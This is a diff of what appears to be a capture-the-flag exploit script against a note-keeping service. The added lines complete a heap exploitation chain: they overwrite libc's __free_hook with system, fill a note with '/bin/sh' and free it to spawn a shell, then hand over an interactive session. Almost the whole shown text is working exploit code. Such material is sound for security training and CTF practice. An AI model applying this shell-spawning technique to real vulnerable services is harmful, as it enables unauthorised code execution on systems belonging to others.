@@ -164,8 +164,15 @@ master_delete_note(r, 0)
 master_delete_note(r, 0)
 master_logout(r)
 user_login(r, "Master of Notes", "casa")
-user_create_note(r, 0, 0x90)
-user_fill_note(r, )
+user_create_note(r, 1, 0x90)
+user_fill_note(r, 1, LIBC.symbols["__free_hook"])
+user_create_note(r, 2, 0x90)
+user_create_note(r, 3, 0x90)
+user_fill_note(r, 3, LIBC.symbols["system"])
+user_fill_note(r, 2, "/bin/sh") 
+user_delete_note(r, 2)
+
+
 
 r.interactive()
 #user_create_note(r, 1, 0xdd0) # fill completely the unused freed chunk
